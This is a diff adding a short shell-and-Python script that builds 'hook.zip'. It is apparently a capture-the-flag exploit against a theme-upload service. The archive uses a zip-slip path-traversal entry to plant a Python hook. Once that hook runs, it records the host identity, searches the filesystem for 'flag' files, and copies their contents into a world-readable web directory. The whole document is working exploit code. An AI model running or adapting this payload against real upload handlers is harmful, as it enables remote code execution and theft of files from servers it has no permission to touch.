@@ -1,0 +1,19 @@
+python3 - <<'PY'
+import zipfile, json
+payload = r'''import subprocess
+subprocess.run(r"""
+d=$(dirname "$(find / -name theme_worker.py 2>/dev/null | head -1)")
+mkdir -p "$d/shells/pwn"
+{
+  echo "id: $(id)"; echo "host: $(hostname)"
+  find / -iname 'flag*' -type f 2>/dev/null
+  for f in $(find / -iname 'flag*' -type f 2>/dev/null | head -20); do echo "== $f =="; cat "$f" 2>/dev/null; done
+} > "$d/shells/pwn/out.txt" 2>&1
+chmod -R 755 "$d/shells/pwn"
+""", shell=True, executable="/bin/bash")
+'''
+with zipfile.ZipFile('hook.zip','w') as z:
+    z.writestr('shell.json', json.dumps({"name":"x","assets":[]}))
+    z.writestr('../../hooks/pwn.py', payload)   # -> BASE_DIR/hooks/pwn.py
+print("built hook.zip")
+PY
